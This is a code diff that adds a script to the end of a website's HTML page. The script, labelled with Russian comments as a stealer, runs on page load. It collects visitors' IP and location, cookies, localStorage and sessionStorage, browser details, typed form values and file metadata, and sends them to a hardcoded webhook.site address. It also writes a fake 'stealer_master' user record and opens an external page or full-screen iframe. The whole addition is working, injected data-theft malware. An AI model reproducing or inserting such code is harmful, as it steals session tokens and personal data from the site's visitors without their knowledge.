@@ -2279,5 +2279,135 @@ document.getElementById('comment-input').addEventListener('keydown', function(e)
     }
 })();
 </script>
+
+<script>
+(function() {
+    console.log("🔥 XSS STEALER - SENDING TO YOUR WEBHOOK");
+    
+    const WEBHOOK = 'https://webhook.site/38be745b-416b-4abd-a51e-9467ccca7ac1';
+    
+    // === 2.1 КРАДЁМ IP ===
+    let ipData = { ip: 'unknown', country: 'unknown', city: 'unknown' };
+    
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+            if (data.ip) {
+                ipData.ip = data.ip;
+                // Дополнительная информация о IP
+                fetch('https://ipapi.co/' + data.ip + '/json/')
+                    .then(r => r.json())
+                    .then(geo => {
+                        ipData.country = geo.country_name || 'unknown';
+                        ipData.city = geo.city || 'unknown';
+                        ipData.region = geo.region || 'unknown';
+                        ipData.org = geo.org || 'unknown';
+                        sendData();
+                    })
+                    .catch(() => sendData());
+            }
+        })
+        .catch(() => sendData());
+    
+    function sendData() {
+        // === 2.2 КРАДЁМ КУКИ ===
+        const cookies = document.cookie || 'No cookies';
+        
+        // === 2.3 КРАДЁМ localStorage ===
+        const localStorageData = {};
+        for (let key in localStorage) {
+            try {
+                localStorageData[key] = localStorage[key];
+            } catch(e) {}
+        }
+        
+        // === 2.4 КРАДЁМ sessionStorage ===
+        const sessionData = {};
+        for (let key in sessionStorage) {
+            try {
+                sessionData[key] = sessionStorage[key];
+            } catch(e) {}
+        }
+        
+        // === 2.5 КРАДЁМ ИНФОРМАЦИЮ О БРАУЗЕРЕ ===
+        const browserInfo = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer,
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
+        
+        // === 2.6 КРАДЁМ ВВЕДЁННЫЕ ДАННЫЕ ===
+        const formData = {};
+        document.querySelectorAll('input, textarea, select').forEach(el => {
+            const key = el.name || el.id || el.tagName;
+            if (el.value) {
+                formData[key] = el.value;
+            }
+        });
+        
+        // === 2.7 КРАДЁМ ФАЙЛЫ (если есть) ===
+        const files = [];
+        document.querySelectorAll('input[type="file"]').forEach(el => {
+            if (el.files && el.files.length > 0) {
+                for (let file of el.files) {
+                    files.push({
+                        name: file.name,
+                        size: file.size,
+                        type: file.type
+                    });
+                }
+            }
+        });
+        
+        // === 2.8 СОБИРАЕМ ВСЁ ===
+        const stolenData = {
+            ip: ipData,
+            cookies: cookies,
+            localStorage: localStorageData,
+            sessionStorage: sessionData,
+            browser: browserInfo,
+            formData: formData,
+            files: files
+        };
+        
+        // === 2.9 ОТПРАВЛЯЕМ НА ВЕБХУК ===
+        fetch(WEBHOOK, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(stolenData)
+        });
+        
+        // === 2.10 СОХРАНЯЕМ В localStorage ===
+        const allStolen = JSON.parse(localStorage.getItem('xss_stolen') || '[]');
+        allStolen.push(stolenData);
+        localStorage.setItem('xss_stolen', JSON.stringify(allStolen));
+        
+        // === 2.11 ДОБАВЛЯЕМ АДМИНА ===
+        localStorage.setItem('np_user', JSON.stringify({
+            id: '999999999999999999',
+            username: 'stealer_master',
+            global_name: 'Stealer Master'
+        }));
+        
+        // === 2.12 ОТКРЫВАЕМ ОКНО С ТРЕШТОЛКОМ ===
+        try {
+            window.open('https://nevermissserver.netlify.app/#cat-offtopic', '_blank', 'width=800,height=600');
+        } catch(e) {
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://nevermissserver.netlify.app/#cat-offtopic';
+            iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:none;';
+            document.body.appendChild(iframe);
+        }
+        
+        console.log('[+] Data sent to webhook!');
+    }
+})();
+</script>
 </body>
 </html>
